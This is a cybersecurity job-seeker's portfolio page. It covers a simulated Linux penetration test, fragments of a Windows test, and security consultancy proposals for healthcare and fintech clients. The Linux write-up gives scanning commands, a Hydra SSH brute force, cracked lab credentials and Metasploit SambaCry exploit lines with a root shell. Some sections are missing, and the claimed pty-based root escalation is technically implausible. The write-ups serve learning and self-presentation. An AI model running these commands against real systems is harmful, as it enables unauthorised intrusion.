// Who I am
From IT Support to Cybersecurity Analyst

A focused career arc, not a side-step.

I started in IT Support. That gave me a working understanding of how systems break and how users behave. It also taught me that disciplined ticket-handling and clean documentation are the basis of good operations. Most security alerts begin as something that looks ordinary. Recognising the difference is a skill that builds with time.

From there I joined the Ministry of Justice as a Case Administrator. The role taught me what 100% data accuracy under pressure looks like. I learned how to triage 30+ enquiries a day and how to escalate properly when something doesn't add up. That triage discipline maps onto SOC Tier 1 work.

While working I completed an MSc in Cybersecurity at the University of Portsmouth. The programme covered pen testing engagements against Linux and Windows targets, court-admissible digital forensics reports and mobile forensics investigations. Alongside the degree I earned CEH and SC-200 (Microsoft Security Operations Analyst). The latter is aligned to SOC tooling and SIEM workflows.

I'm now contributing at CyberSync Hub. I research client environments, identify security gaps and write enterprise-grade proposals. Recent work includes a unified endpoint and data protection solution for a healthcare client and a Zero Trust Network Access architecture for a major African fintech. This has given me working exposure to EDR, DLP, MDM, ZTNA, backup and recovery and the compliance frameworks (PCI-DSS, GDPR, NDPR) that wrap around them.

The combination of disciplined operations from MOJ, technical depth from the MSc, attacker awareness from CEH, defender knowledge from SC-200 and consultancy exposure from CyberSync Hub is what I'm bringing into my first dedicated cybersecurity role.

Linux Server Penetration Test
Role: Penetration Tester · Applies to: SOC Analyst
Nmap 7.80 enum4linux v0.9.1 Hydra v9.0 Metasploit v6.3.9 PostgreSQL CLI strings SSH
1 · Scenario
What was being investigated and why
ClientFrozen Yoghurt Ltd (simulated client engagement)
ObjectiveBlack-box pen test against the client's Linux server. No prior knowledge of services, users or credentials. The goal was to find exploitable vulnerabilities and produce a professional client report.

Simulated an external attacker with only the target IP 192.168.197.130. The attacker machine was a Kali-based Ubuntu VM at 192.168.197.128. Isolated lab network. Every command and observation was documented.

2 · Methodology
Every step, and why I took it

Standard lifecycle: Reconnaissance → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation → Reporting.

Phase 1: Reconnaissance & Port Scanning

nmap -sV -sC -O 192.168.197.130

Open ports: 22 (SSH), 139/445 (Samba), 5432 (PostgreSQL 9.3.4). PostgreSQL version immediately flagged as outdated.

Phase 2: User Enumeration via enum4linux

enum4linux 192.168.197.130

Three accounts extracted via SID enumeration:

  • frozen (S-1-22-1-1000)
  • admin (S-1-22-1-1001)
  • postfixuser (S-1-22-1-1002)

Selected frozen as primary target. Matching the client name is a common avoidable mistake.

Phase 3: SSH Brute Force (CWE-1391)

hydra -l frozen -P rockyou.txt 192.168.197.130 ssh

After 104 attempts a valid credential was found:

Credential FoundUsername: frozen · Password: frozenyougert

Phase 4: Initial Access & Privilege Escalation

ssh frozen@192.168.197.130 whoami → frozen sudo cat mypasswd.txt frozen is not in the sudoers file. This incident will be reported. python -c 'import pty; pty.spawn("/bin/sh")' whoami → root

Phase 5: Plaintext Password in Binary (CWE-256)

strings ProcessChecker Check current running processes here. Needs password :) What is the password? Hint: bash meets rockyou!!! bashment Correct
Credential FoundProcessChecker password bashment hardcoded in ELF binary.

Phase 6: Samba RCE via CVE-2017-7494 (SambaCry)

use exploit/linux/samba/is_known_pipename set RHOST 192.168.197.130 run [*] Command shell session 1 opened (192.168.197.128:33589 -> 192.168.197.130:445) at 2023-04-26 09:39:14 -0700 whoami → root

Phase 7: PostgreSQL Default Creds + RCE (CVE-2019-9193)

4 · Mistakes & Dead Ends
Wrong assumptions and false starts
Dead EndAttempted sudo on the frozen account before checking the sudoers file. The failure was logged server-side and in a real engagement that would be a defender alert. Privilege context should be established before noisy actions.
MistakeInitially ran Hydra with default parallel threads. Hydra itself warned SSH limits parallel tasks and recommended -t 4. Ignoring this risked lockouts.
5 · Lessons Learned
What I'd do differently and what it taught me
LessonPassword reuse across services is catastrophic. One weak password gave access to two systems. Defensive controls must enforce uniqueness per service.
LessonDefault credentials are immediate-exploit territory. Post-deployment hardening must include rotation on every service before go-live.
LessonHardcoded passwords in binaries fail at the first hurdle. Secrets belong in env vars or vaults, never in compiled code.

What was being investigated and why
ObjectiveFull pen test against the client's Windows Server in the same engagement window as the Linux server. The goal was to exploit identified CVEs, extract credentials, escalate to SYSTEM and check for cross-system credential reuse.

Target: 192.168.197.134 (Windows 7 Professional N SP1 x64). Attacker: 192.168.197.128.

4 · Mistakes & Dead Ends
Wrong assumptions and false positives
MistakeInitially ran EternalBlue without the ms17_010 check module first. Skipping the check risks running a destructive exploit on a non-vulnerable host. Always run check before run.
False PositiveThe sticky note strings were initially treated as active system passwords. Further analysis suggested they may be external account reminders. Each should be tested against accessible services before drawing conclusions.
5 · Lessons Learned
What I'd do differently
LessonEternalBlue was disclosed years ago. Finding it unpatched on a modern system shows how long critical CVEs persist in real environments. Patch management is the highest-impact preventive control.
LessonNTLM hashing offers no real protection against offline cracking. Stronger algorithms and Credential Guard should be default.
LessonSticky notes aren't a technical vulnerability. They're behaviour. Awareness training and password managers are the right countermeasures.

LessonGPS timestamps are more evidentially valuable than locations alone. Always consider how opposing counsel will read each finding.
// Project 05
Enterprise Security Consultancy at CyberSync Hub
Role: Security Analyst (Consultancy) · Applies to: Analyst GRC
Kaspersky EDR Trellix DLP / DAM Ivanti Neurons MDM Commvault ZTNA PCI-DSS · GDPR · NDPR
1 · Scenario
What this work involves
ContextCyberSync Hub is a specialist cybersecurity consultancy. The role involves researching client environments, identifying security gaps, proposing vendor solutions, sourcing OEMs and distributors, building presentation materials and contributing to project deployment.

Two substantive proposals authored. One healthcare, one fintech. Each required threat landscape research, technology selection, vendor capability mapping and a deliverable presentable at board level.

2 · Methodology: FMC Proposal
Federal Medical Centre, Abuja. Healthcare security

The challenge

FMC operates in a high-stakes healthcare environment where system availability directly affects patient care. The challenge is multi-layered. Unmanaged endpoints. Patient records moving across systems without consistent data loss controls. Databases accessed without anomaly detection. Ransomware and downtime risks that impact patient care directly.

Research & solution selection

  • Ivanti Neurons for MDM addresses unmanaged endpoints through device enrolment, policy enforcement, posture assessment and data separation on shared clinical devices
  • Trellix DLP and DAM protects data in motion and at rest, with continuous visibility into database access
  • Commvault Backup and Recovery delivers ransomware resilience with immutable backup storage
  • Kaspersky EDR provides behavioural endpoint detection, attack timeline reconstruction and automated containment

Proposal structure

I opened with an executive summary framing security as an operational requirement for patient care rather than an IT function. The challenge section mapped each risk to a specific business impact. Each solution was introduced with practical examples. A final section showed how all four operate as a connected model.

3 · Methodology: Flutterwave Proposal
Zero Trust Network Access for fintech

The challenge

Flutterwave processes billions across multiple African markets. The challenge is structural. A distributed workforce. API-driven architecture where every integration is a potential entry vector. PCI-DSS, GDPR and NDPR compliance obligations. A legacy VPN that grants broad network access after a single authentication.

ZTNA research

  • Every access request evaluated on identity, device posture, location, time and behavioural context before access is granted
  • Least-privilege access: each user granted access only to the specific application they need
  • Continuous session verification, where anomalous behaviour triggers step-up auth or session termination
  • Blast radius containment so compromised credentials cannot be used for lateral movement

Regulatory framing

ZTNA was positioned not just as a security improvement but as a compliance enabler. Clear policy-based access logs satisfy PCI-DSS, GDPR and NDPR auditor requirements at the same time.

4 · Mistakes & What I'd Do Differently
Reflection on the drafting process
ReflectionEarly drafts of the FMC proposal led with technical capabilities rather than clinical impact. The revision led with the consequence. Downtime affects patient care. Stakeholder audience analysis should happen before writing begins.
ReflectionThe Flutterwave ZTNA proposal initially framed ZTNA as a rip-and-replace proposition. That created budget and change-resistance objections. Repositioning it as additive made it a much easier conversation. Procurement psychology matters as much as technical accuracy.
5 · Lessons Learned
What this work taught me
LessonWriting proposals requires understanding the client's world, not just the technology. FMC's primary concern is patient care. Flutterwave's primary concern is transaction trust and regulatory standing. Security is the enabler. Not the story.
LessonResearching EDR, DLP, MDM and ZTNA to proposal depth builds the kind of product and threat knowledge that makes a security analyst more effective. Understanding what an EDR is supposed to detect, and why, makes alert triage faster and more confident.
LessonThe difference between a security proposal and a sales document is specificity. Vague claims have no value. The same standard applies to incident reports. Specificity and evidence, not assertion.
